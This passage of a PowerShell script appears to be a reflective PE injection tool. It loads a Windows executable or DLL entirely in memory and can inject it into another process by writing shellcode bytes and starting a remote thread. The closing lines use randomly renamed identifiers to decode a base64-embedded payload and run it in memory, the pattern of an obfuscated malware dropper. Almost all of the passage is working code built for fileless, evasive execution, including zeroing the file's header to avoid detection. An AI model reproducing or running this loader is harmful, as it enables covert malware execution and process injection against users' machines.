			{
				Throw "Call to VirtualProtect failed"
			}


			$ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
			$Win32Functions.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitFunctionAddr, [UInt64]$TotalSize) | Out-Null
			$ReturnArray += ,($ProcExitFunctionAddr, $ExitProcessOrigBytesPtr, $TotalSize)



			Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $ProcExitFunctionAddrTmp
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ProcExitFunctionAddrTmp, $false)
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $ProcExitFunctionAddrTmp
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $ProcExitFunctionAddrTmp, $false)
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			Write-BytesToMemory -Bytes $Shellcode3 -MemoryAddress $ProcExitFunctionAddrTmp

			$Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}


		Write-Output $ReturnArray
	}




	Function Copy-ArrayOfMemAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Array[]]
		$CopyInfo,

		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,

		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)

		[UInt32]$OldProtectFlag = 0
		foreach ($Info in $CopyInfo)
		{
			$Success = $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}

			$Win32Functions.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null

			$Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}
	}





	Function Get-MemoryProcAddress
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,

		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FunctionName
		)

		$Win32Types = Get-Win32Types
		$Win32Constants = Get-Win32Constants
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants


		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
		{
			return [IntPtr]::Zero
		}
		$ExportTablePtr = Add-SignedIntAsUnsigned ($PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
		$ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)

		for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++)
		{

			$NameOffsetPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
			$NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))
			$Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)

			if ($Name -ceq $FunctionName)
			{


				$OrdinalPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
				$FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])
				$FuncOffsetAddr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
				$FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])
				return Add-SignedIntAsUnsigned ($PEHandle) ($FuncOffset)
			}
		}

		return [IntPtr]::Zero
	}


	Function Invoke-MemoryLoadLibrary
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,

		[Parameter(Position = 1, Mandatory = $false)]
		[String]
		$ExeArgs,

		[Parameter(Position = 2, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle,

        [Parameter(Position = 3)]
        [Bool]
        $ForceASLR = $false
		)

		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])


		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types

		$RemoteLoading = $false
		if (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$RemoteLoading = $true
		}


		Write-Verbose "Getting basic PE information from the file"
		$PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
		$OriginalImageBase = $PEInfo.OriginalImageBase
		$NXCompatible = $true
		if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
		{
			Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
			$NXCompatible = $false
		}



		$Process64Bit = $true
		if ($RemoteLoading -eq $true)
		{
			$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
			$Result = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "IsWow64Process")
			if ($Result -eq [IntPtr]::Zero)
			{
				Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
			}

			[Bool]$Wow64Process = $false
			$Success = $Win32Functions.IsWow64Process.Invoke($RemoteProcHandle, [Ref]$Wow64Process)
			if ($Success -eq $false)
			{
				Throw "Call to IsWow64Process failed"
			}

			if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
			{
				$Process64Bit = $false
			}


			$PowerShell64Bit = $true
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$PowerShell64Bit = $false
			}
			if ($PowerShell64Bit -ne $Process64Bit)
			{
				throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
			}
		}
		else
		{
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$Process64Bit = $false
			}
		}
		if ($Process64Bit -ne $PEInfo.PE64Bit)
		{
			Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
		}



		Write-Verbose "Allocating memory for the PE and write its headers to memory"


		[IntPtr]$LoadAddr = [IntPtr]::Zero
        $PESupportsASLR = ([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -eq $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
		if ((-not $ForceASLR) -and (-not $PESupportsASLR))
		{
			Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again OR try using the -ForceASLR flag (could cause crashes)" -WarningAction Continue
			[IntPtr]$LoadAddr = $OriginalImageBase
		}
        elseif ($ForceASLR -and (-not $PESupportsASLR))
        {
            Write-Verbose "PE file doesn't support ASLR but -ForceASLR is set. Forcing ASLR on the PE file. This could result in a crash."
        }

        if ($ForceASLR -and $RemoteLoading)
        {
            Write-Error "Cannot use ForceASLR when loading in to a remote process." -ErrorAction Stop
        }
        if ($RemoteLoading -and (-not $PESupportsASLR))
        {
            Write-Error "PE doesn't support ASLR. Cannot load a non-ASLR PE in to a remote process" -ErrorAction Stop
        }

		$PEHandle = [IntPtr]::Zero
		$EffectivePEHandle = [IntPtr]::Zero
		if ($RemoteLoading -eq $true)
		{

			$PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)


			$EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($EffectivePEHandle -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
			}
		}
		else
		{
			if ($NXCompatible -eq $true)
			{
				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			}
			else
			{
				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			}
			$EffectivePEHandle = $PEHandle
		}

		[IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
		if ($PEHandle -eq [IntPtr]::Zero)
		{
			Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
		}
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null



		Write-Verbose "Getting detailed PE information from the headers loaded in memory"
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		$PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
		$PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
		Write-Verbose "StartAddress: $(Get-Hex $PEHandle)    EndAddress: $(Get-Hex $PEEndAddress)"



		Write-Verbose "Copy PE sections in to memory"
		Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types



		Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
		Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types



		Write-Verbose "Import DLL's needed by the PE we are loading"
		if ($RemoteLoading -eq $true)
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
		}
		else
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
		}



		if ($RemoteLoading -eq $false)
		{
			if ($NXCompatible -eq $true)
			{
				Write-Verbose "Update memory protection flags"
				Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
			}
			else
			{
				Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
			}
		}
		else
		{
			Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
		}



		if ($RemoteLoading -eq $true)
		{
			[UInt32]$NumBytesWritten = 0
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
			if ($Success -eq $false)
			{
				Throw "Unable to write shellcode to remote process memory."
			}
		}



		if ($PEInfo.FileType -ieq "DLL")
		{
			if ($RemoteLoading -eq $false)
			{
				Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
				$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)

				$DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
			}
			else
			{
				$DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)

				if ($PEInfo.PE64Bit -eq $true)
				{

					$CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{

					$CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				$SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
				$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
				$SCPSMemOriginal = $SCPSMem

				Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)

				$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
				if ($RSCAddr -eq [IntPtr]::Zero)
				{
					Throw "Unable to allocate memory in the remote process for shellcode"
				}

				$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
				if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
				{
					Throw "Unable to write shellcode to remote process memory."
				}

				$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
				$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
				if ($Result -ne 0)
				{
					Throw "Call to CreateRemoteThread to call GetProcAddress failed."
				}

				$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			}
		}
		elseif ($PEInfo.FileType -ieq "EXE")
		{

			[IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
			[System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
			$OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr



			[IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			Write-Verbose "Call EXE Main function. Address: $(Get-Hex $ExeMainPtr). Creating thread for the EXE to run in."

			$Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

			while($true)
			{
				[Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
				if ($ThreadDone -eq 1)
				{
					Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
					Write-Verbose "EXE thread has completed."
					break
				}
				else
				{
					Start-Sleep -Seconds 1
				}
			}
		}

		return @($PEInfo.PEHandle, $EffectivePEHandle)
	}


	Function Invoke-MemoryFreeLibrary
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$PEHandle
		)


		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types

		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants


		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)

			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)


				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done unloading the libraries needed by the PE"
					break
				}

				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
				$ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

				if ($ImportDllHandle -eq $null)
				{
					Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
				}

				$Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
				if ($Success -eq $false)
				{
					Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
				}

				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}


		Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
		$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)

		$DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null


		$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
		if ($Success -eq $false)
		{
			Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
		}
	}


	Function Main
	{
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		$Win32Constants =  Get-Win32Constants

		$RemoteProcHandle = [IntPtr]::Zero


		if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
		{
			Throw "Can't supply a ProcId and ProcName, choose one or the other"
		}
		elseif ($ProcName -ne $null -and $ProcName -ne "")
		{
			$Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
			if ($Processes.Count -eq 0)
			{
				Throw "Can't find process $ProcName"
			}
			elseif ($Processes.Count -gt 1)
			{
				$ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
				Write-Output $ProcInfo
				Throw "More than one instance of $ProcName found, please specify the process ID to inject in to."
			}
			else
			{
				$ProcId = $Processes[0].ID
			}
		}









		if (($ProcId -ne $null) -and ($ProcId -ne 0))
		{
			$RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
			if ($RemoteProcHandle -eq [IntPtr]::Zero)
			{
				Throw "Couldn't obtain the handle for process ID: $ProcId"
			}

			Write-Verbose "Got the handle for the remote process to inject in to"
		}



		Write-Verbose "Calling Invoke-MemoryLoadLibrary"
		$PEHandle = [IntPtr]::Zero
		if ($RemoteProcHandle -eq [IntPtr]::Zero)
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -ForceASLR $ForceASLR
		}
		else
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle -ForceASLR $ForceASLR
		}
		if ($PELoadedInfo -eq [IntPtr]::Zero)
		{
			Throw "Unable to load PE, handle returned is NULL"
		}

		$PEHandle = $PELoadedInfo[0]
		$RemotePEHandle = $PELoadedInfo[1]



		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
		{



	        switch ($FuncReturnType)
	        {
	            'WString' {
	                Write-Verbose "Calling function with WString return type"
				    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "WStringFunc"
				    if ($WStringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $WStringFuncDelegate = Get-DelegateType @() ([IntPtr])
				    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
				    [IntPtr]$OutputPtr = $WStringFunc.Invoke()
				    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
				    Write-Output $Output
	            }

	            'String' {
	                Write-Verbose "Calling function with String return type"
				    [IntPtr]$StringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "StringFunc"
				    if ($StringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $StringFuncDelegate = Get-DelegateType @() ([IntPtr])
				    $StringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StringFuncAddr, $StringFuncDelegate)
				    [IntPtr]$OutputPtr = $StringFunc.Invoke()
				    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($OutputPtr)
				    Write-Output $Output
	            }

	            'Void' {
	                Write-Verbose "Calling function with Void return type"
				    [IntPtr]$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
				    if ($VoidFuncAddr -eq [IntPtr]::Zero)
				    {

				    }
					else
					{
				    $VoidFuncDelegate = Get-DelegateType @() ([Void])
				    $VoidFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VoidFuncAddr, $VoidFuncDelegate)
				    $VoidFunc.Invoke() | Out-Null
					}
	            }
	        }



		}

		elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
			if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
			{

			}
			else{
			$VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
			$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle


			$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
			}
		}



		if ($RemoteProcHandle -eq [IntPtr]::Zero -and $PEInfo.FileType -ieq "DLL")
		{

		}
		else
		{






		}

		Write-Verbose "Done!"
	}

	Main
}


Function Main
{
	if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
	{
		$DebugPreference  = "Continue"
	}

	Write-Verbose "PowerShell ProcessID: $PID"


	$e_magic = ($PEBytes[0..1] | % {[Char] $_}) -join ''

    if ($e_magic -ne 'MZ')
    {
        throw 'PE is not a valid PE file.'
    }

	if (-not $DoNotZeroMZ) {


		$PEBytes[0] = 0
		$PEBytes[1] = 0
	}


	if ($ExeArgs -ne $null -and $ExeArgs -ne '')
	{
		$ExeArgs = "ReflectiveExe $ExeArgs"
	}
	else
	{
		$ExeArgs = "ReflectiveExe"
	}

	if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR)
	}
	else
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR) -ComputerName $ComputerName
	}
}

Main
}

[Byte[]]$eoZTFXroSebByIg = [Byte[]][Convert]::FromBase64String($lGeMEPAFTZzxywY)
Invoke-wfpnQBjgeYsffkM -PEBytes $eoZTFXroSebByIg